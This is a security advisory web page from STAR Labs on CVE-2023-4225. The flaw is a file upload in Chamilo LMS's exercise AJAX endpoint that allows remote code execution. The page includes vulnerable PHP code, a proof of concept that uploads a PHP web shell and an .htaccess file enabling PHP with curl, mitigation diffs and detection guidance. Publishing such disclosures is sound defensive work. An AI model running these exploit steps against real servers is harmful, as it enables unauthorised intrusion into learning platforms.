<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary    Product Chamilo     Vendor Chamilo   Severity High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.   Affected Versions &lt;= v1.11.24   Tested Versions v1.11.24 (latest version as of writing)   CVE Identifier CVE-2023-4225   CVE Description Unrestricted file upload in /main/inc/ajax/exercise.ajax.php in Chamilo LMS &lt;= v1.11.24 allows authenticated attackers with learner role to obtain remote code execution via uploading of PHP files.">
<meta name="author" content="Ngo Wei Lin (@Creastery)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-4225/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution" />
<meta property="og:description" content="Summary    Product Chamilo     Vendor Chamilo   Severity High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.   Affected Versions &lt;= v1.11.24   Tested Versions v1.11.24 (latest version as of writing)   CVE Identifier CVE-2023-4225   CVE Description Unrestricted file upload in /main/inc/ajax/exercise.ajax.php in Chamilo LMS &lt;= v1.11.24 allows authenticated attackers with learner role to obtain remote code execution via uploading of PHP files." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-4225/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-28T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-28T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution"/>
<meta name="twitter:description" content="Summary    Product Chamilo     Vendor Chamilo   Severity High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.   Affected Versions &lt;= v1.11.24   Tested Versions v1.11.24 (latest version as of writing)   CVE Identifier CVE-2023-4225   CVE Description Unrestricted file upload in /main/inc/ajax/exercise.ajax.php in Chamilo LMS &lt;= v1.11.24 allows authenticated attackers with learner role to obtain remote code execution via uploading of PHP files."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution",
      "item": "https://starlabs.sg/advisories/23/23-4225/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution",
  "name": "(CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution",
  "description": "Summary    Product Chamilo     Vendor Chamilo   Severity High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.   Affected Versions \u0026lt;= v1.11.24   Tested Versions v1.11.24 (latest version as of writing)   CVE Identifier CVE-2023-4225   CVE Description Unrestricted file upload in /main/inc/ajax/exercise.ajax.php in Chamilo LMS \u0026lt;= v1.11.24 allows authenticated attackers with learner role to obtain remote code execution via uploading of PHP files.",
  "keywords": [
    
  ],
  "articleBody": "Summary    Product Chamilo     Vendor Chamilo   Severity High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.   Affected Versions   Tested Versions v1.11.24 (latest version as of writing)   CVE Identifier CVE-2023-4225   CVE Description Unrestricted file upload in /main/inc/ajax/exercise.ajax.php in Chamilo LMS   CWE Classification(s) CWE-434: Unrestricted Upload of File with Dangerous Type   CAPEC Classification(s) CAPEC-650: Upload a Web Shell to a Web Server    CVSS3.1 Scoring System Base Score: 8.8 (High)\nVector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Product Overview Chamilo is an open-source PHP-based Learning Management System (LMS) that facilitates online education and training. It offers features such as course creation, content management, assessments, collaboration and delivering educational resources.\nVulnerability Summary The largely-identical file upload chunking implementation used by main/inc/ajax/document.ajax.php, main/inc/ajax/dropbox.ajax.php, main/inc/ajax/exercise.ajax.php and main/inc/ajax/work.ajax.php does not impose any restrictions on the uploaded file. The uploaded file is written into SYS_ARCHIVE_PATH, which defaults to //app/cache. Although there is a .htaccess file present in //app/cache, it can be overwritten to permit execution of PHP files.\nConsequently, an authenticated attacker with learner role may exploit these vulnerabilities to perform stored cross-site scripting attacks, as well as obtain remote code execution, via uploading of PHP files.\nNote: This advisory details the third file upload vulnerability in main/inc/ajax/exercise.ajax.php (CVE-2023-4225). The advisories for the other 3 vulnerabilites can be found here – CVE-2023-4223, CVE-2023-4224 and CVE-2023-4226.\nVulnerability Details The vulnerable portion of /main/inc/ajax/exercise.ajax.php is shown below:\n... $action = $_REQUEST['a']; ... switch ($action) { ... case 'upload_file': api_block_anonymous_users(); if (isset($_REQUEST['chunkAction']) \u0026\u0026 'send' === $_REQUEST['chunkAction']) { // It uploads the files in chunks  if (!empty($_FILES)) { $tempDirectory = api_get_path(SYS_ARCHIVE_PATH); // [1]  $files = $_FILES['files']; $fileList = []; foreach ($files as $name = $array) { $counter = 0; foreach ($array as $data) { $fileList[$counter][$name] = $data; $counter++; } } if (!empty($fileList)) { foreach ($fileList as $n = $file) { $tmpFile = $tempDirectory.$file['name']; // [2]  file_put_contents( // [3]  $tmpFile, fopen($file['tmp_name'], 'r'), FILE_APPEND ); } } } ... } ... ... } exit; At [1], $tempDirectory is set to /. At [2], the user-supplied filename is used in constructing the destination filepath relative to $tempDirectory.\nAt [3], the uploaded file is saved into the /app/cache directory of the web root using the user-supplied filename. Since /app/cache is meant to be writable by the webserver, it is possible to append to the //app/cache/.htaccess to enable PHP execution.\nConsequently, an attacker with learner role can simply upload a PHP web shell to obtain authenticated remote code execution.\nExploit Conditions An attacker with learner role with access view a course, even if the user is not subscribed to the course, is expected to be able to execute this exploit scenario reliably.\nProof-of-Concept  Ensure that a course named test with Open visibility (access permitted by all users registered on the platform) is created. Log in to an account with learner role and note down the value of the ch_sid session cookie. On the attacker’s machine, run the following commands to create the necessary files for the exploit:  $ echo ''  rce.php $ cat .htaccess php_flag engine on AcceptPathInfo on order allow,deny allow from all  EOF Run the following shell commands on the attacker’s machine to upload the PHP web shell to the victim target: $ curl -s -b 'ch_sid=' 'http:///main/exercise/exercise.php?cidReq=TEST' $ curl -b 'ch_sid=' -F 'files[0]=@rce.php' -F 'files[1]=@.htaccess' 'http:///main/inc/ajax/exercise.ajax.php?a=upload_answer\u0026chunkAction=send'  Run the following command to execute the PHP web shell: $ curl http:///app/cache/rce.php/ uid=33(www-data) gid=33(www-data) groups=33(www-data)  Observe that the id shell command is successfully executed, confirming the unrestricted file upload vulnerability.  Suggested Mitigations Ensure that the user-supplied filename is sanitised accordingly to prevent files with dangerous file extensions from being uploaded.\nFor example:\n... foreach ($fileList as $n = $file) { - $tmpFile = $tempDirectory.$file['name']; + $sanitizedFileName = $disable_dangerous_file( + api_replace_dangerous_char($file['name']) + ); + $tmpFile = $tempDirectory.$sanitizedFileName;  file_put_contents( $tmpFile, fopen($file['tmp_name'], 'r'), FILE_APPEND ); } ... However, note that disable_dangerous_file() only prevents PHP and .htaccess files, and do not prevent uploading of HTML files. As such, it is still possible to achieve unauthenticated stored cross-site scripting (XSS) by uploading a HTML file.\nIt is therefore recommended to enhance the implementation of disable_dangerous_file() in main/inc/lib/fileUpload.lib.php to also prevent uploading of HTML files.\nLastly, it is advised to add the following rules to the default .htaccess file:\n# Disallow direct access to /main/inc/lib/javascript/bigupload/files RedirectMatch 403 ^/main/inc/lib/javascript/bigupload/files # Disallow MIME sniffing to prevent XSS from unknown/incorrect file extensions Header always set X-Content-Type-Options nosniff End users are encouraged to update to the latest version of Chamilo.\nDetection Guidance It is possible to detect the exploitation of this vulnerability by:\n checking the server’s access logs for all requests made to /main/inc/ajax/exercise.ajax.php, checking the server’s access logs for all requests made to /app/cache/*, and checking /app/cache/ directory for presence of modified .htaccess or PHP files.  Credits Ngo Wei Lin (@Creastery) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-09-04 Vendor Disclosure 2023-09-06 Initial Vendor Contact 2023-09-12 Sent additional information to vendor regarding incomplete fixes found 2023-09-27 Vendor Patch Release (v1.11.26) completely fixing vulnerability 2023-09-29 Vendor published the vulnerability sumamry 2023-09-29 Mutual agreement to delay the publication of vulnerability details was reached in light of the recent in-the-wild exploitation of Chamilo N-day vulnerability (CVE-2023-34960) 2023-11-28 Public Release  ",
  "wordCount" : "909",
  "inLanguage": "en",
  "datePublished": "2023-11-28T00:00:00Z",
  "dateModified": "2023-11-28T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Ngo Wei Lin (@Creastery)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-4225/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-4225) Chamilo LMS Exercise Ajax File Upload Functionality Remote Code Execution
    </h1>
    <div class="post-meta"><span title='2023-11-28 00:00:00 +0000 UTC'>November 28, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Ngo Wei Lin (@Creastery)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System">CVSS3.1 Scoring System</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview">Product Overview</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary">Vulnerability Summary</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details">Vulnerability Details</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions">Exploit Conditions</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept">Proof-of-Concept</a></li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations">Suggested Mitigations</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance">Detection Guidance</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Chamilo</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Chamilo</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt;= v1.11.24</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>v1.11.24 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-4225</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Unrestricted file upload in <code>/main/inc/ajax/exercise.ajax.php</code> in Chamilo LMS &lt;= v1.11.24 allows authenticated attackers with learner role to obtain remote code execution via uploading of PHP files.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-434: Unrestricted Upload of File with Dangerous Type</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-650: Upload a Web Shell to a Web Server</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 8.8 (High)<br>
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>Chamilo is an open-source PHP-based Learning Management System (LMS) that facilitates online education and training. It offers features such as course creation, content management, assessments, collaboration and delivering educational resources.</p>
<h2 id="vulnerability-summary">Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>The largely-identical file upload chunking implementation used by <code>main/inc/ajax/document.ajax.php</code>, <code>main/inc/ajax/dropbox.ajax.php</code>, <code>main/inc/ajax/exercise.ajax.php</code> and <code>main/inc/ajax/work.ajax.php</code> does not impose any restrictions on the uploaded file. The uploaded file is written into <code>SYS_ARCHIVE_PATH</code>, which defaults to <code>/&lt;path-to-webroot&gt;/app/cache</code>. Although there is a <code>.htaccess</code> file present in <code>/&lt;path-to-webroot&gt;/app/cache</code>, it can be overwritten to permit execution of PHP files.</p>
<p>Consequently, an authenticated attacker with learner role may exploit these vulnerabilities to perform stored cross-site scripting attacks, as well as obtain remote code execution, via uploading of PHP files.</p>
<p><em><strong>Note:</strong> This advisory details the third file upload vulnerability in <code>main/inc/ajax/exercise.ajax.php</code> (CVE-2023-4225). The advisories for the other 3 vulnerabilites can be found here &ndash; <a href="/advisories/23/23-4223/">CVE-2023-4223</a>, <a href="/advisories/23/23-4224/">CVE-2023-4224</a> and <a href="/advisories/23/23-4226/">CVE-2023-4226</a>.</em></p>
<h2 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>The vulnerable portion of <a href="https://github.com/chamilo/chamilo-lms/blob/v1.11.24/main/inc/ajax/exercise.ajax.php#L1165-L1187"><code>/main/inc/ajax/exercise.ajax.php</code></a> is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nv">$action</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;upload_file&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">api_block_anonymous_users</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;chunkAction&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="s1">&#39;send&#39;</span> <span class="o">===</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;chunkAction&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// It uploads the files in chunks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$tempDirectory</span> <span class="o">=</span> <span class="nx">api_get_path</span><span class="p">(</span><span class="nx">SYS_ARCHIVE_PATH</span><span class="p">);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$files</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;files&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$fileList</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$fileList</span><span class="p">[</span><span class="nv">$counter</span><span class="p">][</span><span class="nv">$name</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$counter</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fileList</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$fileList</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$tmpFile</span> <span class="o">=</span> <span class="nv">$tempDirectory</span><span class="o">.</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nx">file_put_contents</span><span class="p">(</span>                       <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="nv">$tmpFile</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="nx">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                            <span class="nx">FILE_APPEND</span>
</span></span><span class="line"><span class="cl">                        <span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">;</span>
</span></span></code></pre></div><p>At [1], <code>$tempDirectory</code> is set to <code>/&lt;path-to-webroot/app/cache</code>. At [2], the user-supplied filename is used in constructing the destination filepath relative to <code>$tempDirectory</code>.</p>
<p>At [3], the uploaded file is saved into the <code>/app/cache</code> directory of the web root using the user-supplied filename. Since <code>/app/cache</code> is meant to be writable by the webserver, it is possible to append to the <code>/&lt;path-to-webroot&gt;/app/cache/.htaccess</code> to enable PHP execution.</p>
<p>Consequently, an attacker with learner role can simply upload a PHP web shell to obtain authenticated remote code execution.</p>
<h2 id="exploit-conditions">Exploit Conditions<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>An attacker with learner role with access view a course, even if the user is not subscribed to the course, is expected to be able to execute this exploit scenario reliably.</p>
<h2 id="proof-of-concept">Proof-of-Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<ol>
<li>Ensure that a course named <code>test</code> with <code>Open</code> visibility (access permitted by all users registered on the platform) is created.</li>
<li>Log in to an account with learner role and note down the value of the <code>ch_sid</code> session cookie.</li>
<li>On the attacker&rsquo;s machine, run the following commands to create the necessary files for the exploit:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">   $ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php system(&#34;id&#34;); ?&gt;&#39;</span> &gt; rce.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   $ cat <span class="s">&lt;&lt; &#39;EOF&#39; &gt; .htaccess
</span></span></span><span class="line"><span class="cl"><span class="s">   php_flag engine on
</span></span></span><span class="line"><span class="cl"><span class="s">   AcceptPathInfo on
</span></span></span><span class="line"><span class="cl"><span class="s">   &lt;FilesMatch &#34;.+&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s">       order allow,deny
</span></span></span><span class="line"><span class="cl"><span class="s">       allow from all
</span></span></span><span class="line"><span class="cl"><span class="s">   &lt;/FilesMatch&gt;
</span></span></span><span class="line"><span class="cl"><span class="s">   EOF</span>
</span></span></code></pre></div><ol start="4">
<li>Run the following shell commands on the attacker&rsquo;s machine to upload the PHP web shell to the victim target:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -s -b <span class="s1">&#39;ch_sid=&lt;ch_sid_value&gt;&#39;</span> <span class="s1">&#39;http://&lt;chamilo&gt;/main/exercise/exercise.php?cidReq=TEST&#39;</span>
</span></span><span class="line"><span class="cl">$ curl -b <span class="s1">&#39;ch_sid=&lt;ch_sid_value&gt;&#39;</span> -F <span class="s1">&#39;files[0]<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dae79aa8b9bff4aab2aa">[email&#160;protected]</a>&#39;</span> -F <span class="s1">&#39;files[1]<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92afd2bcfae6f3f1f1f7e1e1">[email&#160;protected]</a>&#39;</span> <span class="s1">&#39;http://&lt;chamilo&gt;/main/inc/ajax/exercise.ajax.php?a=upload_answer&amp;chunkAction=send&#39;</span>
</span></span></code></pre></div></li>
<li>Run the following command to execute the PHP web shell:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl http://&lt;chamilo&gt;/app/cache/rce.php/
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div></li>
<li>Observe that the <code>id</code> shell command is successfully executed, confirming the unrestricted file upload vulnerability.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>Ensure that the user-supplied filename is sanitised accordingly to prevent files with dangerous file extensions from being uploaded.</p>
<p>For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">    ...
</span></span><span class="line"><span class="cl">    foreach ($fileList as $n =&gt; $file) {
</span></span><span class="line"><span class="cl"><span class="gd">-       $tmpFile = $tempDirectory.$file[&#39;name&#39;];
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+       $sanitizedFileName = $disable_dangerous_file(
</span></span></span><span class="line"><span class="cl"><span class="gi">+           api_replace_dangerous_char($file[&#39;name&#39;])
</span></span></span><span class="line"><span class="cl"><span class="gi">+       );
</span></span></span><span class="line"><span class="cl"><span class="gi">+       $tmpFile = $tempDirectory.$sanitizedFileName;
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>        file_put_contents(
</span></span><span class="line"><span class="cl">            $tmpFile,
</span></span><span class="line"><span class="cl">            fopen($file[&#39;tmp_name&#39;], &#39;r&#39;),
</span></span><span class="line"><span class="cl">            FILE_APPEND
</span></span><span class="line"><span class="cl">        );
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    ...
</span></span></code></pre></div><p>However, note that <code>disable_dangerous_file()</code> only prevents <code>PHP</code> and <code>.htaccess</code> files, and do not prevent uploading of <code>HTML</code> files. As such, it is still possible to achieve unauthenticated stored cross-site scripting (XSS) by uploading a <code>HTML</code> file.</p>
<p>It is therefore recommended to enhance the implementation of <code>disable_dangerous_file()</code> in <a href="https://github.com/chamilo/chamilo-lms/blob/v1.11.24/main/inc/lib/fileUpload.lib.php#L57-L60">main/inc/lib/fileUpload.lib.php</a> to also prevent uploading of <code>HTML</code> files.</p>
<p>Lastly, it is advised to add the following rules to the default <code>.htaccess</code> file:</p>
<pre tabindex="0"><code># Disallow direct access to /main/inc/lib/javascript/bigupload/files
RedirectMatch 403 ^/main/inc/lib/javascript/bigupload/files

# Disallow MIME sniffing to prevent XSS from unknown/incorrect file extensions 
Header always set X-Content-Type-Options nosniff
</code></pre><p>End users are encouraged to update to the latest version of Chamilo.</p>
<h2 id="detection-guidance">Detection Guidance<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by:</p>
<ol>
<li>checking the server&rsquo;s access logs for all requests made to <code>/main/inc/ajax/exercise.ajax.php</code>,</li>
<li>checking the server&rsquo;s access logs for all requests made to <code>/app/cache/*</code>, and</li>
<li>checking <code>/app/cache/</code> directory for presence of modified <code>.htaccess</code> or <code>PHP</code> files.</li>
</ol>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
